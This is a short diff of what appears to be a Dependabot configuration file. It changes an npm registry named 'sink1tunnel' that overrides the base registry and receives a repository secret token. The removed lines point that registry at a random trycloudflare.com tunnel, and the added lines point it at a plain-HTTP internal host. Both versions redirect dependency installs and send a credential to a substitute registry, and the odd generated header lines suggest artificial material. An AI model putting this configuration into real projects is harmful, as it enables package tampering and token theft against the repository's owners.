@@ -1,13 +1,13 @@
-# p145 fork fleet 1790630950
+# p7r p15b_co 1790631746
 version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/
+    url: http://consul/
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
 updates:
   - package-ecosystem: "npm"
     directory: "/"
-    schedule: {interval: "hourly"}
+    schedule: {interval: "daily"}
     registries: "*"
